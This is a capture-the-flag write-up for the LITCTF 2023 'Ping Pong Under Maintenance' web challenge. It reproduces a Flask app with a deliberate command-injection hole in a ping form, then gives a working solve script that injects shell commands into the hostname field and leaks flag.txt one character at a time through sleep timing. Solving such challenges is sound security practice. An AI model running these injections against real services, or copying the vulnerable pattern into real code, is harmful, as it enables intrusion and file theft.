# Web - Ping Pong Under Maintenance (LITCTF 2023)

## Problem

Compared to "Ping Pong", we are given a modified `app.py` file as follows:

```python
from flask import Flask, render_template, redirect, request
import os

app = Flask(__name__)

@app.route('/', methods = ['GET','POST'])
def index():
    output = None
    if request.method == 'POST':
        hostname = request.form['hostname']
        cmd = "ping -c 3 " + hostname
        output = os.popen(cmd).read()

    return render_template('index.html', output='The service is currently under maintainence and we have disabled outbound connections as a result.')
```

## Solution

As the result of the command injection vulnerability is no longer displayed, we need to use other mechanisms to find the flag. I chose to use a timing-based attack where we sleep for 2 additional seconds if a character of a flag matches our guess. We then use this method to enumerate all flag characters. Solve script is as follows:


```python
import requests, time, string

url = 'http://34.130.180.82:59685/'
# Add characters to flag 1 by 1 in case timeout
flag = 'LITCTF{c4refu1_fr}'
while flag[-1] != '}':
    j = len(flag)
    found = False
    for c in '}{_' + string.ascii_lowercase + string.digits + string.ascii_uppercase:
        cmd = f'a; if [ $(python3 -c "print(\'1\' if open(\'flag.txt\', \'r\').read()[{j}] == \'{c}\' else \'\')") ]; then sleep 2; fi'
        start = time.time()
        r = requests.post(url, data={'hostname': cmd})
        duration = time.time() - start
        print(duration, r.status_code, c)
        # Need to test locally, >2s for me = char match
        if duration > 2:
            found = True
            flag += c
            break
    if not found:
        flag += '?'
    print('Flag:', flag)

```

## Flag

LITCTF{c4refu1_fr}

